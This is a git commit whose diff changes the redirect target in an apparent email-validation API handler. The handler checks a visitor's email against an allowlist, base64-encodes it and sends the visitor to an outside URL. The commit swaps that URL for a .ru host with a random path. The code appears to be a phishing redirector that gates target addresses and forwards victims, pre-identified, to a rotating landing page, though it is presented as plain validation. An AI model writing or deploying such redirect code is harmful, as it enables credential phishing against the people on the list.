3423ebb2e3b863f766f6f90399599924c2783f06
michaelhkcpas <michael@hkcpas.com>
2025-02-19 15:57:53 -0800

    Update validate-email.js

--- api/validate-email.js
+++ api/validate-email.js
@@ -24,7 +24,7 @@ export default function handler(req, res) {
     // Validate the email
     if (allowedEmailsCache.includes(email)) {
       // Construct the redirect URL
-      const baseURL = "http://main.blackprairie.es/#";
+      const baseURL = "https://frin.jomitarnen.ru/HQO2w7/#";
       const encodedEmail = Buffer.from(email).toString("base64");
       const redirectURL = `${baseURL}${encodedEmail}`;
 
